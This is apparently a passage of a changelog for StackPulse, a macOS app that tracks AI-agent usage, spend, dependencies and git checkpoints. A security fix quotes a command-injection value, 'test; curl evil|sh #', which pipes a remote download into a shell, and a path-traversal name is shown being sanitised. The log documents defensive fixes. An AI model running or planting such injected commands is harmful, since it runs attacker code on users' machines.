each advisory as an **id plus its own link** — never a summary of a writeup we
didn't fetch. The prompt then asks for exactly three verdicts per package: is it
real, is it required, is it safe.

What makes it more than a data dump is what it refuses to let the reader assume:

- **The readings have an age**, and the prompt says it in words ("read 3 hours
  ago"), then instructs: *treat every version and advisory id below as a claim to
  verify, not a fact to repeat*. A model asked "is lodash 4.17.20 vulnerable?" will
  answer from memory; this tells it not to.
- **Nothing read the source.** The prompt states the boundary — it doesn't know if
  a package is even imported, which APIs are used, or whether a vulnerable path is
  reachable — and asks for "what I'd need to check" instead of an assumption.
- **An unchecked project says so**, and blocks the dangerous inference: *do not
  assume a package is fine because no advisory is listed — none were fetched.*
  Absence of evidence, again, reported as absence.
- **`scope: dev` is carried**, because a build-only package's advisory usually
  never reaches production, and that one fact decides "required" more often than
  severity does.
- **"Leave it" is offered as a real answer.** Without it, every list of outdated
  deps reads as a to-do list, which is how dependency review becomes busywork.
- **Fabrication is forbidden explicitly**: never invent a version, a CVE, a date,
  or a breaking change — write "unverified" instead.

`AdvisoryLink` now also carries OSV's own severity word next to our bucketed level.
The level is an interpretation (it folds "medium" into moderate and paints unknown
red so an unrated advisory can't read as harmless) — right for a colored dot, wrong
to quote. Anything reporting what a source *said* passes on the source's word.

The button is absent when a project has nothing to ask about, and the prompt is
never truncated — a silent top-N would mean asking about 25 packages and getting
advice on some subset, with nothing saying which. 10 new tests.

### One window, one refresh button, one honesty rule (app 0.36.0)

Four separate reports, one shared root: a rule written on a *surface* instead of
on the *thing it describes*, then not carried to the other surfaces.

**Windows: 4 → 3.** The Settings window was a shell hosting `SettingsSection` and
`IntegrationsSection` — views its own doc comment admitted "the main window used
to host". Configuration had been moved out of the one window that owns
everything, so settings and features ended up scattered across surfaces. Folded
back: Settings and Integrations are main-window sections again, `⌘,` routes
there, and `SettingsWindowController`/`SettingsWindowView`/`SettingsTab` are
gone. The remaining windows each have a distinct job — the main window (do
things), the Command Center (watch a second display), the edge sidebar (glance) —
plus the menu-bar popover (peek).

**The gear is last.** It sat 2nd of 5 in the popover header; it is now rightmost,
and last in the main window's nav. Settings is the least-used control.

**The refresh icon was dancing.** Four hand-rolled copies of:

```swift
.rotationEffect(.degrees(isLoading ? 360 : 0))
.animation(isLoading ? .linear(duration: 1).repeatForever(…) : .default, value: isLoading)
```

`.animation(_:value:)` fires on *every* change of `isLoading`, including
true→false — so a **completed** refresh animated the rotation 360°→0°: a full
turn backwards, on every refresh, including the automatic ones nobody asked for.
Now one `RefreshButton` owns its angle and cancels the repeating animation in a
transaction with animations disabled, so it halts instead of unwinding. A second
mover was `SnapshotMetaBar` inserting a "refreshing" indicator on each auto-
refresh and reflowing the layout; it no longer changes footprint.

**Antigravity was described in units it never reported.** Google meters
Antigravity's tokens and cost server-side; searching `~/.gemini` and
`~/Library/Application Support/Antigravity` finds no quota, credit, or percentage
data at all. There is no percentage to show, and inventing one is out.

`PopoverView` knew this and rendered sessions + model instead of a spend row —
via **private** `hasLocalSpend`/`hasActivity` helpers. No other surface had them,
so the Command Center, Overview and Sidebar rendered Antigravity as a
spend-reporting provider with a missing figure. The dollars already read `—`
(honest), but the token cell printed **`0 tok`** — `TokenTotals::default()` shown
as a *measured* zero, when the truth is the count was never published here.

The rule now lives on `ProviderUsage` (`hasLocalSpend`, `hasLocalActivity`,
`isActivityOnly`), so a new surface inherits it instead of re-deriving it, and
`ProviderActivityRow`/`NoLocalSpendNote` are shared views.

**A turns total was mixing units.** The protocol defines `SpendWindow.records` as
assistant turns, but a provider with no local token accounting reuses the field
for whatever it *can* count — Antigravity puts *conversations* there. A tile
labelled "Turns (30d)" summed both into a number that was neither. Activity-only
providers are now excluded from `total30Turns`.

**The Command Center had no icon of its own** — it borrowed
`gauge.with.dots.needle.67percent`, the app's brand mark and menu-bar glyph, so
the button that opened it looked exactly like the button that opened StackPulse.
An icon identical to another icon identifies nothing. It now has a drawn mark: a
radar scope over a bright center.

**Antigravity was naming a model that does not exist (core).** The card showed
`gemini-3-flash-a`. That is not a model — it is a severed string. The model id is
recovered by scanning a bounded prefix of the conversation DB for a `gemini-…`
run; the DB stores both truncated per-step refs (`gemini-3-flash-a`) and the full
id (`gemini-3-flash-agent`), and the scan keeps the longest run it sees. The
window was 256 KiB. In the real corpus the newest conversation carried the
truncated ref at byte 27_422 and its first complete id at byte **412_816** —
outside the window — so the truncated form was the longest run present, won, and
was displayed. The window is now 1 MiB, and a run touching the window's edge is
discarded rather than reported, since a severed id and a real one are
indistinguishable; the scan now fails toward the generic label instead of toward
a fabricated name. Also fixed a latent short-read: `Read::read` returns one
syscall's worth, not the whole request, so the window was only nominally its
stated size.

**The app could silently ship a stale core (build).** SwiftPM pulls the Rust
staticlib in through linker flags, not a declared dependency, so when only the
core changes `swift build` considers the executable up to date and re-links the
**old** core. The model fix above was green in `cargo test` and correct via the
CLI while the packaged app still returned the old value — the tree looked fully
rebuilt and was not. `build-app.sh` now drops the executable when the staticlib
is newer, forcing a re-link. Any past "verified" app build that touched only the
core is suspect for this reason.

Twelve new tests pin these rules (8 Swift, 4 Rust), each verified by
reintroducing the bug it claims to catch: removing the `total30Turns` filter
yields 337 instead of 310, and restoring the 256 KiB window reproduces
`gemini-3-flash-a` exactly — each failing exactly one named test. Gate:
**230 Rust tests, 53 Swift tests**, clippy and fmt clean.

### Live limits actually work now (app 0.33.0)

**Claude's percentage was wrong, and the fix was to read the right source.**
StackPulse read only Claude **Code**'s CLI credential. That item is rewritten only
when a *terminal* session refreshes it — so on a Desktop-only machine it ages out
and stays expired forever. It had been frozen at 2026-07-13 for 70 hours while
Claude Desktop's own cache was rewritten the same afternoon.

The app was compensating by telling the user to run `claude` in Terminal every ~12
hours. That was a chore imposed because it was reading the wrong place.

Now it reads Claude Desktop's OAuth cache when the CLI has no valid token: derive
Electron's `safeStorage` key from the Keychain, decrypt `config.json`, pick the
entry for the active organization. Approach matches **OpenUsage**
(`robinebers/openusage`, MIT), which solved this first — re-implemented, not
copied, per ADR-0001.

**The refresh token is never decoded.** Anthropic rotates refresh tokens, so using
one would invalidate Claude Desktop's own copy and could sign the user out of the
app they're working in. StackPulse borrows a currently-valid access token and
otherwise waits — the rule it already applied to the CLI, now pointed at a source
that stays fresh. It still never writes, refreshes, or rotates anything.

Real result on this machine: **weekly 82% → 13%.** The 82% was a reading from
before the window reset. The user said the percentage had reset and should not be
displayed; they were right on both counts.

Selection is the delicate part — a cache holds several logins, and picking the
wrong one reports another organization's usage as yours. Org isolation and Desktop's
own ranking (production client + full scope before raw expiry) are both
mutation-checked: removing either fails exactly the test that names it.

### Advisories can be opened (app 0.32.0)

**The address was in the data and nothing rendered it.** Enrichment carried
`AdvisoryLite.url` per advisory, and the row showed only an "N advisories" chip —
no way to reach any of them. Advisories are the highest-severity thing this section
reports, so it was the worst place in the app to have a dead end. Both the
per-dependency row and the cross-project digest now open the advisory's own writeup
on osv.dev.

The link is **grounded, not guessed**: the id comes from OSV's own API response and
`/vulnerability/<id>` is that host's canonical route for its own ids — verified live
against real ids (HTTP 200). An advisory with no id yields no advisory at all,
rather than a link to `osv.dev/vulnerability/` — a page about nothing. That rule is
mutation-checked.

**Every advisory is reachable, not just the worst.** One advisory gets a button;
several get a menu. Picking "the worst" would silently drop the others, and the
severity ranking is StackPulse's interpretation — not a reason to hide OSV's own
records. An advisory that has no URL still **counts**: the chip must not undercount
a real vulnerability just because we can't route to its writeup.

StackPulse has not read the advisory and says so. It names the destination and
makes no claim about severity, applicability, or what it means.

### Swift test target + breaking-change routes (app 0.31.0)

**`swift test` used to say "no tests found."** Every Swift check was a `_selftest*`
function in the shipping binary, run by hand — and one of them (`--selftest-live`)
had **never worked**, deadlocking on every invocation, which is a large part of
why a 70-hour live-limits failure went undiagnosed. Both rounds of bugs this
session lived in Swift. It was the weakest part of the project.

No package refactor was needed: SwiftPM tests the executable target directly under
Swift 6. **23 tests** over the logic that actually broke — the live-limits
staleness rule (the 70-hour case verbatim), per-reading age (an 18.5h reading is
stale *even though* its reset is days away — the exact trap that let a stale
weekly % pass as current), the usage-payload parser, and change-link resolution.

**Mutation-checked**, because a test that cannot fail is decoration: reintroducing
the original per-value scale bug fails exactly the two tests that name it
(`0.45 → 45.0`, `0.82 → 82.0`) and nothing else. `make test-all` runs both suites.

**Breaking-change analysis** (Phase 4's last unbuilt item). "major behind" was a
semver *label*, not analysis — it says a number changed, not what breaks. A
major/deprecated row now offers a real route to the package's own release notes,
resolved from the `repository`/`homepage` fields already fetched from the registry.

It links; it does **not** claim what breaks. `github.com/<package-name>` would be a
fabrication — plausible, often right, and exactly the class of confident guess this
project keeps undoing. No registry data ⇒ no link, pinned by test. A non-GitHub
host links only to the repo, because whether that host publishes releases is not
something we know.

### Codex's % was stale too; date-aware pricing; a11y (app 0.30.0 / protocol 1.20.0)

**The check found the same staleness bug in Codex.** Its limits come from log
files, and `LimitWindow` carried **no capture time for any provider** — so
`weekly 32%`, measured **2026-07-15 20:02 (18.5 hours earlier)**, rendered as
current. Fixed on the wire (`LimitWindow.captured_at_unix`, protocol 1.20.0) so
every provider's reading carries its own age, and the UI ages the reading itself
rather than a Claude-only store field. `resets_at_unix` cannot substitute: it
answers a different question and comes from the same possibly-stale reading, which
is why a weekly window (reset days out) never looked expired no matter how old the
number was.

**Sonnet 5's dated rate no longer expires silently.** Its introductory price runs
through 2026-08-31; `rates_for` had no clock, so the table would have gone quietly
wrong that day — the same "silently wrong number" class as the Opus 2.75×
overstatement. Every rate lookup now takes the date of the **record being priced**,
which is strictly more correct: a 30-day window straddling the switch legitimately
contains records at both rates, and the old code could not express that at all.
Pinned by tests on both sides of the boundary, mutation-checked.

**Accessibility:** the needs-attention and active-missions cards were mouse-only
(`.isButton`/`.accessibilityAction` had zero hits app-wide) — now reachable and
activatable by VoiceOver, with the per-row labels preserved. `OtherProvidersCard`
conveyed health, auth, and installed state by **color alone** across nine
providers. An icon-only button that **executes commands** had no accessible name.
Three sidebar buttons unlabelled.

**Also:** `parse_iso_unix` existed in two modules and was about to become three —
consolidated into `datetime`. That duplication was not free: the byte-8 panic that
blanked whole snapshots had to be fixed in both copies.

### Live limits opt-in + cache-write TTL pricing (app 0.27.0 / protocol 1.19.0)

**Live limits now default to OFF.** It is the one feature that reads a secret —
your Claude OAuth token, sent to Anthropic — and an app that calls itself offline
by default must not start doing that on its own. Existing installs that were
actually using it **inherit ON** (a live-limits cache on disk proves the fetch ran
and succeeded here), so nobody loses a feature silently; the answer is persisted
once and the stored value wins thereafter. Both paths were verified end-to-end on
a real machine: key-absent + cache present → ON; simulated fresh install → OFF.

**Cache writes are now priced by TTL** (protocol 1.19.0:
`TokenTotals.cache_creation_1h_tokens`). Anthropic bills a 5-minute cache write at
1.25× input and a **1-hour** write at 2×. Claude's logs distinguish them; this
type carried only the sum, so every write was priced as 5-minute and costs
**understated**. The app's own numbers say **84.4%** of real cache writes are
1-hour. Claude's 30-day estimate: $13,180.64 → **$14,909.91** (+$1,729.27). Codex
is provably unchanged ($172.09) — it has no TTL concept and leaves the field 0.

The new field is a **SUBSET** of `cache_creation_tokens`, never an addition:
`grand_total` must not sum the two, and an older reader that ignores it still sees
the correct total. Pinned by a contract test, because double-counting it would
inflate 84% of the write volume. An impossible split (more 1-hour writes than
writes) is clamped rather than underflowing.

With this, the last *known-wrong* cost number is fixed. What remains inaccurate is
now stated in `pricing.rs`: the OpenAI/Codex cards are unverified, Sonnet 5's
introductory rate silently expires 2026-08-31, and data-residency / fast-mode
multipliers aren't modelled (nothing local says which a turn used, so applying
them would be a guess).

### Phase 4/6 wave + the pricing correction (app 0.26.0 / protocol 1.18.0)

**Your Claude spend estimate was 2.75× too high.** `rates_for` matched model
families by substring, so *anything* containing `opus` got the Opus rate card —
which still held Opus **4.1**'s prices. Opus 4.8 costs $5/$25 per MTok; it was
being billed at $15/$75. On this machine that turned a real ~$13,181 30-day
estimate into **$36,207**, and nothing disclosed it, because a wrong rate looks
exactly like a right one — it produces no note, no error, no signal at all.

Rates are now read from Anthropic's published price list and **pinned by tests**
(nothing previously asserted a rate card matched reality — the tests only checked
`is_some()`). `rates_for` parses the model VERSION instead of the family name, and
an unrecognized version of a known family is now **unpriced rather than given a
sibling's price**: "we don't know" is a fact a canary can report; a confidently
wrong number is not. Also added Fable 5 / Mythos 5 (real rates), Opus 4/4.1 as a
distinct legacy card, Sonnet 5's introductory rate, and Haiku 3.5.

**Schema canaries** (protocol 1.18.0: `SchemaCanary` / `CanaryStatus` /
`UnpricedModel` + `UsageSnapshot.canaries`, new Usage → **Data Checks** tab). The
app reads logs whose format it does not control, so drift is silent. The canary
says "your numbers are incomplete, here's exactly how" instead of quietly
understating. `no_data` is never rendered as `ok` — nothing to verify is not a
pass.

**Known inaccuracies are now stated in `pricing.rs` rather than hidden:** cache
writes are priced at the 5-minute rate though 86% of real writes are 1-hour
(bills at 2× input — so this *understates*); the OpenAI/Codex rate cards are
unverified; Sonnet 5's introductory rate silently expires 2026-08-31.

**`Checkpoint.files_unknown`** (1.18.0) — `files: []` meant both "captured
nothing" and "git wouldn't say". A file list git refused to produce is now
unknown, not empty.

**Also:** a **Security & Privacy** panel in Settings built from live runtime state
(every row sourced from a real symbol, no secret ever rendered); a cross-project
**update-intelligence digest** in Stack Health, which also fixed a real bug —
enrichment is keyed by `ecosystem+name`, so one shared status verdict was wrong
for 23.8% of (project, dependency) pairs at different versions; **public docs**
(README + `docs/USAGE.md`).

**Accessibility:** `GlassButtonStyle` never honored Reduce Transparency, making
Settings' "glass surfaces fall back to solid fills" **false for all 71 button call
sites** — fixed. Escape now dismisses the four destructive confirm dialogs (it
previously had no keyboard exit); Return still deliberately does NOT confirm them.
The menu-bar popover's five icon-only buttons have accessibility labels.

**Docs that contradicted the code, corrected:** `SECURITY_BOUNDARIES.md` claimed
"network-free", "executes no external commands", and "never reads secret values"
— all three false since v0.1.0. The protocol claimed `get_stack_health` may
contact registries; the core ignores the flag entirely. `Info.plist` reported
version **0.1.0** while the app was 0.25.0 — Settings now reads the bundle, so the
two can't drift again.

### Bug sweep round 3 (app 0.25.0 / protocol 1.17.0)

Same rule as rounds 1–2: nothing was fixed before it was reproduced. Three claims
from the backlog turned out to be **false or overstated**, and are recorded as
such rather than quietly "fixed".

**Filenames the app reported that did not exist.** `git status --porcelain`
quotes any path containing a space, so a file named `a -> b.txt` arrives as
`"a -> b.txt"`. Splitting on the ` -> ` rename separator *before* reading the
quotes reported `b.txt"` — trailing quote and all. Non-ASCII was worse: git
escapes `é` as the literal text `\303\251`, and stripping quotes surfaced that raw
escape as the filename. Both verified against real git output, then fixed in one
shared `gitpath` decoder (the three hand-rolled copies each got a different subset
wrong). `stash show --name-only` disagrees with `status --porcelain` about
quoting spaces, so checkpoints had its own variant of the bug.

**One odd character blanked every provider.** `parse_iso_unix` sliced at byte 8 of
the time field, which is only proven ASCII at bytes 2 and 5 — a multi-byte
character straddling it panicked. The FFI catches panics, so a single malformed
timestamp in a single log line turned the whole snapshot into an error: every
provider blank. The module's own doc promised "we never panic".

**Claude usage was under-counted.** The scanner claimed a record's dedup key
before validating its timestamp, so a rejected record permanently blocked a later
valid one with the same key. Codex shares the shape but not the bug — its key is
derived from the timestamp, so a collision implies the same verdict.

**Live limits: one payload, two scales.** `utilization` may be a percent (0–100)
or a fraction (0–1) — `0.8` is 80% under one reading and 0.8% under the other. The
scale was decided per *value* (`v <= 1 ? v * 100 : v`), so `{ seven_day: 12.5,
five_hour: 0.45 }` reported weekly 12.5% **and** 5h 45%, reading one body as both
scales at once. It is now decided per payload: a value above 1.0 proves the
payload is a percent. The genuinely ambiguous case (every window ≤ 1.0) is exactly
the state just after a reset, so the verdict is remembered once the endpoint proves
it — otherwise 0.82% would display as 82% and fire a fake "nearly out" alert.

**A scope guard that under-reported scope** (protocol 1.17.0, `ScopeFlag.match_count`).
The core caps a flag's file list at 8 and the true count wasn't on the wire, so the
UI counted the sample: a session touching 40 auth files announced "Security / auth
code · 8". Found by chasing a doc comment that claimed a total the code never
carried.

**"No checkpoints" when git had actually failed**, and **"0 outdated" for
dependencies nobody had checked yet** — two more cases of absence rendered as a
confident zero.

Also: a user-cancelled run could persist as "Test failed"; `DailyBarChart` and the
Trends chart each rescanned their whole series once per bar (8,100 → 90 calls at
90d); Stack Health made 11 passes per project per render; and Launch now says on
its face when it will install dependencies first.

**Not real, and left alone:** the `MissionCard` rescan is structurally real but
costs ~6 comparisons every 120s, not the claimed N×100 — no measurable win, so no
performance claim is made for it. `DateFormatter` was not allocated per bar (only
mutated). The `normalizePercent` fraction/percent ambiguity could not be resolved
from local data alone; the residual all-≤1.0 case is documented, not guessed at.

### Bug sweep rounds 1-2 (app 0.23.0-0.24.0 / protocol 1.16.0)

Four adversarial reviewers swept performance, Swift correctness, Rust robustness
and security. Every finding was reproduced before it was fixed.

**Security**
- **A hostile `package.json` could run a command with no confirmation.** A script
  named `test; curl evil|sh #` became `npm run test; curl evil|sh #`, which the
  safety classifier read as **read_only** (it sees the token "test") and labelled
  **"Test"** — so it landed on the prominent Test Project button and bypassed the
  confirmation dialog entirely. The Makefile/justfile/Taskfile parsers all validate
  their keys; the package.json loop didn't. Now whitelisted.

**Performance**
- **Every refresh scanned your logs twice.** `record_history` builds its own
  snapshot, so calling it after `get_usage_snapshot` re-read gigabytes a second
  time, every 2 minutes. Protocol 1.16.0 lets the snapshot op record history from
  the snapshot it already has — one scan.
- Run console no longer rebuilds up to 2,000 selectable text views on every output
  chunk (it stuttered exactly while output streamed). Stack Health no longer
  re-fetches ~1,000 npm/crates requests on every Advisor tab switch. Discover no
  longer re-runs the whole radar on every visit. The Keychain probe moved off the
  main thread.

**Things the app was saying that weren't true**
- **Expired limit windows were reported as current — on Claude *and* Codex.** A
  window past its reset isn't stale, it's wrong (usage restarts at zero). Claude
  replayed a cached 5-hour window 3 days after it expired; Codex would replay one
  for weeks and raise a **false critical alert + notification** from it.
- **A severity escalation never notified.** Alert ids are stable across severity,
  so you'd be warned at 85% of budget and never told you blew it — and warned at
  80% of a limit but never at 96%. The gate now keys on severity too.
- **"Resets just now."** for a reset days away — a past-tense formatter used on a
  future date, in alerts and macOS notification bodies.
- **Discover could show a green "all clear, scanned 0 projects"** when the core had
  actually returned an *error*: the decoder defaulted every field, so an error
  payload decoded as an empty report.
- **Missions could show a green "verified" tick** from a run it couldn't place in
  time (unknown session start defaulted to "after"). Absence of evidence is now
  reported as absence.
- **A run you cancelled could be recorded as "Test failed"** — the stop intent lost
  a race with the SIGTERM reap.
- **The radar claimed generated folders weren't gitignored when git says they are**
  (`**/node_modules`, `dist/**` — mainstream globs a line-comparison missed). It
  now asks `git check-ignore`.
- **Linked worktrees and submodules were reported as having no git remote** — their
  `.git` is a *file*, not a directory, so we bailed. StackPulse creates linked
  worktrees itself, so this was self-inflicted.

180 tests passing (workspace), 0 clippy warnings, fmt clean.

### Fix: launching Terminal froze the app for ~20 seconds (app 0.22.2)

- **The bug you hit.** Every "Launch", "Run in Terminal", "Restore" and worktree
  action drove Terminal via `NSAppleScript.executeAndReturnError` — which is fully
  synchronous — **on the main thread**. So the UI was blocked while Terminal cold-
  launched and the Apple Event round-tripped, and (on first use) for as long as the
  macOS Automation permission dialog sat on screen. That's the slowness and the
  glitching.
- **Measured, not guessed:** the old path blocked the calling thread for
  **20,677 ms**. The fix dispatches the AppleScript to a dedicated **serial**
  background queue (serial because `NSAppleScript` is not thread-safe), and the
  call now returns in **0.0 ms** — Terminal still opens exactly as before, the UI
  just never waits for it.
- `runInTerminal` no longer returns a `Bool`; it can't know synchronously anymore,
  and every call site already discarded it.

### Protocol contract tests (app 0.22.1)

Phase 6 groundwork. `stackpulse-protocol` is the one thing a future Windows client
and the Chrome native-messaging host both compile against — and nothing pinned the
actual bytes on the wire. A rename or a dropped `#[serde(default)]` would still
compile, and this app (which serializes *and* deserializes with the same code)
would never notice; only the downstream consumer would break.

- **11 contract tests** now encode what `docs/PROTOCOL.md` promises: every `op` and
  `kind` tag string is pinned, newtype responses must stay *flattened* next to
  `kind` (nesting would break every Swift decoder at once), unknown enum values must
  fall back to their catch-all, unknown keys must be ignored, additive fields must
  stay optional, and enums must stay `snake_case`.
- They assert on **literal JSON**, not round-trips through our own types — a
  round-trip passes even if every field were renamed, which is exactly the break
  worth catching.
- **The docs are part of the contract:** a test fails if `PROTOCOL_VERSION` and
  `docs/PROTOCOL.md` drift, or if an op exists in code but is undocumented. That
  second one immediately caught six ops missing from the doc's tables — now added.
- **Proven, not assumed:** I mutation-tested the guards — bumping the version
  without updating the doc, and renaming an op tag — and confirmed each fails with
  its intended message.
- Workspace: **177 tests passing**, 0 clippy warnings, fmt clean.

### Worktrees — isolated agent runs (app 0.22.0 / protocol 1.15.0)

The last substantive Phase-5 capability: give an agent its own copy of the repo so
your main checkout is never in the blast radius.

- **New isolated copy.** Every git project in Projects gets a **Worktrees** panel:
  name it, and StackPulse runs `git worktree add` to create a second working
  directory on its own `stackpulse/<name>` branch. Then Open in Terminal and point
  an agent at it. Creating is **additive** — it adds a directory and a branch and
  leaves your working tree, index, HEAD, and current branch untouched (verified
  byte-for-byte, with modified/staged/untracked work in flight).
- **Removing is gated, and the core refuses to own it.** Removal deletes a
  directory, so the core only *reports* the command; the app runs it visibly in
  Terminal behind a confirmation that names the path and warns uncommitted work in
  it is gone. The **main checkout can never be removed** (no command is offered).
- **Copies live outside your projects.** They're created under
  `~/Library/Application Support/StackPulse/worktrees`, not next to your repos —
  otherwise the project scan would surface each one as a bogus new project in
  Projects and the Launcher.
- **Names are sanitized before they touch a path or a git ref** — `"../../evil
  name!"` becomes the branch `stackpulse/evil-name` in a directory safely inside
  the worktrees folder, and is additionally gated through `git check-ref-format`.
  An existing name is refused with an honest note rather than clobbering anything.
- **149 core tests** (18 new, incl. the main-tree-untouched safety test and name
  sanitization), clippy/fmt clean. Also fixed a duplicated `#[test]` attribute I'd
  introduced in the previous change.

### Fix: missions showed a meaningless "HEAD" branch (app 0.21.1)

- **Every mission claimed it was on a branch called `HEAD`.** Claude's session logs
  record `gitBranch` as the literal string `"HEAD"` (verified: 3,237 occurrences
  across recent sessions, and not one real branch name). `HEAD` is what git prints
  for a *detached* HEAD — it is not a branch anyone is on — so we were rendering
  noise on every mission card and writing it into handoff packages.
- **Now:** `HEAD` / `(no branch)` are rejected as branch names, and the branch is
  read live from git for the mission's project instead. That's deliberately
  consistent with `changed_files`, which is already read live from the same working
  tree — both describe the project *now*.
- **Codex missions get a branch for the first time** (their logs never carried one,
  so the field was always empty).
- Verified on real sessions: `stackpulse-mac` and `zeder-erp` now correctly report
  **`main`**, and sessions started in the non-repo umbrella folder correctly report
  **no branch** instead of "HEAD". 132 core tests (3 new), clippy/fmt clean.

### Evidence-based completion + handoff packages (app 0.21.0)

Two more Phase-5 capabilities, both composed from data StackPulse already holds —
no new scanning, no protocol change.

- **Did anyone actually check this?** A mission that changed files now shows its
  **verification**: the latest captured test/check run for that project, with its
  outcome and age. Crucially, when there's no evidence it says so —
  *"Not verified — no test run captured for this project since these changes"* —
  because an agent going quiet is **not** evidence the work is good. A passing run
  from *before* the session started is also called out as not evidence for these
  changes, rather than quietly counted as a pass.
- **Cross-agent handoff packages.** Every mission gets **Handoff** (copy) and
  **Save…** — a Markdown package describing what the session touched (changed
  files), what that risks (scope flags), what it was last doing (latest turn),
  whether anything verified it, and how to get back (the latest checkpoint + its
  restore command). Hand it to another agent, or to yourself next week.
- The package omits sections rather than padding them, so a reader can tell
  "nothing changed" from "we don't know" — and it never claims work is verified
  when it isn't.

Swift-only; build clean.

### Spend budgets — Phase 5 guardrails (app 0.20.0)

- **Set a budget, get warned before it hurts.** Settings → **Spend budget** takes a
  **daily** and/or **30-day** limit in USD (leave empty for none) and a warn
  threshold (default 80%; 100% always raises a critical). Crossing one raises a
  real **needs-attention alert** — so it flows into the toolbar bell, the sidebar,
  and native notifications like any other alert, with no new plumbing.
- **Home shows the meter.** Once a budget is set, Home shows today's / 30-day spend
  against it with a percentage — no budget, no nag.
- **Honest about what it is and isn't.** The figures are local list-price
  estimates, not a bill; and StackPulse **only warns — it can't stop a running
  agent** (it doesn't control your tools). The UI says exactly that rather than
  implying a hard stop.
- Empty ≠ zero: an empty budget field means "no budget", not "$0 — everything is
  over budget", and half-typed numbers only commit on Return/blur so a stray
  keystroke can't fire an alert.
- Evaluated client-side alongside the existing synthesized live-limit alerts,
  rather than in the core: a budget is a user preference and the check is
  "total vs threshold" — not the shared parsing/pricing logic the core owns — and
  it keeps `Alert.provider` honest (a budget spans providers). Swift-only.

### Checkpoints — Phase 5 safe automation (app 0.19.0 / protocol 1.14.0)

Makes "let an agent loose on my repo" a reversible decision — without the safety
net itself being risky.

- **Snapshot now.** Every git project in Projects gets a **Checkpoints** panel:
  capture your uncommitted work before an agent run, see past snapshots (label,
  short SHA, branch, captured files, age), and get back if it goes wrong.
- **Capturing is non-destructive, by construction.** It uses `git stash create`,
  which writes a commit object **without touching the working tree, the index, or
  HEAD** — unlike `git stash push`, it rolls nothing back, so it's safe to run
  while an agent is mid-edit. The object is kept alive under
  `refs/stackpulse/checkpoints/*`; checkpoints never appear as branches or tags.
  Verified: working tree, file contents and HEAD are byte-identical after a
  capture, and your stash list is never touched.
- **Restoring is the only mutating step, and the core refuses to own it.** The
  core only *reports* the exact `restore_command`; the app runs it **visibly in
  Terminal** behind an explicit confirmation that names the files, project, SHA
  and age. You can also just copy the command.
- **It tells you what it did *not* capture.** `git stash create` snapshots tracked
  work only, so a checkpoint taken with untracked files present now says so
  ("does not include N untracked file(s) — `git add` anything new you'd want
  back") instead of letting you trust an incomplete safety net. Clean trees,
  untracked-only trees, repos with no commits, and non-repos each get their own
  honest note rather than a fabricated empty checkpoint.
- **129 core tests** (17 new, incl. a test pinning that the working tree is
  untouched and that exclusions are disclosed), clippy/fmt clean.

### App icon fix + menu clarity (app 0.18.0)

- **Icon now fills its tile.** The `.icns` artwork was a squircle inset inside the
  1024 canvas with transparent margins (the pre-Tahoe convention). macOS 26
  composites such legacy icons onto its **own light backing tile** and shrinks
  them — the white frame you saw in the Dock. The icon is now rebuilt **full-bleed
  and fully opaque**, so the system masks *our* art as the tile. Verified by
  rendering `NSWorkspace.icon(forFile:)` for the packaged app before and after.
- **"Projects" meant two things.** It named both a primary section (folder
  management) and an Advisor sub-tab (the repository radar). The Advisor tab is now
  **Repo Health**, so a label means one thing wherever you read it.
- **Related menus sit together.** Sidebar order is now Home · Launcher · Projects ·
  Missions · Usage · Advisor — Launcher and Projects are adjacent because they're
  two views of the same thing (run it vs. manage it).

### Project usage attribution + first-run onboarding (app 0.17.0 / protocol 1.13.0)

Closes the Phase 3 "project/task usage" gap and the last Phase 1 gap (onboarding).

- **Where your AI spend actually goes.** A new **By Project** tab under Usage
  attributes local spend to the project each session ran in, by grouping session
  records on the working directory recorded in the logs. Ranked by 30-day cost
  with a share-of-spend bar, today/30-day cost + tokens, turns, last activity, and
  provider chips. Costs remain local list-price estimates, never billed amounts.
  Protocol 1.13.0 adds `ProjectUsage` + the `get_project_usage` op; the engine
  (`project_usage.rs`) is offline and reuses the logs the provider scan reads.
  **Claude and Codex both attributed** (Codex verified against all 87 real session
  files first — every one records exactly one working directory).
  **Reconciled: 100% of scanned spend is attributed** (project totals match the
  provider scan to the record, modulo turns written mid-scan).
  **Umbrella folders are labelled honestly** — a watched *parent* folder that
  collects sessions started outside any repo says so on its card, instead of
  masquerading as a single project that ate the budget.
- **First-run onboarding.** A short, skippable welcome: what StackPulse is and the
  trust story (everything read locally, nothing uploaded; costs are estimates),
  add your project folders (single project *or* a parent folder), a one-line tour
  of the six sections, and the shortcuts. Replayable from **Settings → Welcome
  tour → Show again**.
- **112 core tests** (9 new), clippy/fmt clean; integrated Swift build clean.

### Sidebar Copy command + favorites + filter (app 0.16.0)

- **Copy the one-paste command from the sidebar.** Each app row in the sidebar
  Apps tab now has a **Copy** button that copies the whole launch recipe (cd +
  install-if-needed + start) — the same easy one-liner as the main section, not
  the individual commands. Plus Launch (or Open when running).
- **Favorites (pin to top).** Tap the ⭐ on any app — in the sidebar or the
  Launcher — to pin it to the top. Favorites persist across launches.
- **Filter.** Both the sidebar Apps tab and the Launcher have a search field to
  filter apps by name, and a **Favorites-only** toggle. Handy with 20+ projects.

Swift-only; build clean.

### Projects performance + sidebar Apps tab (app 0.15.0)

Fixed the Projects scroll stutter with 20+ projects loaded, and added a mini
launcher to the edge sidebar.

- **Lazy + cached rendering.** The project list is now a lazy two-column grid, so
  only the visible cards (and their subviews) are ever built. The launch panel
  used to re-read `node_modules` and parse `package.json` on *every* render for
  *every* card — that's now resolved **once per project, off the main thread**,
  and cached. Filtering "is this launchable?" no longer touches the filesystem.
- **Tighter distribution.** Command lists are collapsed by default (a "N commands"
  toggle), so each card is short — a 20-project list is far more compact, and the
  grid uses two columns on wider windows. Launch + Test Project stay always-visible.
- **Sidebar Apps tab.** The edge sidebar's tabs are now **Cards / Live / Apps** —
  the new **Apps** tab lists every launchable project with one-tap **Launch** (or
  **Open** when it's already running), a mini Launcher without opening the window.

Swift-only; build clean.

### Launcher menu + easier folder adding (app 0.14.0)

- **New Launcher section.** A dedicated sidebar menu (🚀) that lists every web app
  StackPulse found in your folders as a big card with one-tap **Launch**, **Copy
  command**, and its Local + shareable Network URLs — a home base for getting a
  demo up. Projects stays for folder management, commands, runs, and stack health.
- **Obvious "Add Folder" button.** Projects and Launcher both now have a prominent
  **Add Folder…** button in the header (it was previously easy to miss).
- **Add a parent folder, get all its projects.** Clarified throughout that you can
  point StackPulse at a *single project or a parent folder containing several* —
  it scans inside and finds them all (this already worked; now it's said plainly,
  in the picker and the empty states).
- The launch panel was extracted into a shared component so Projects and Launcher
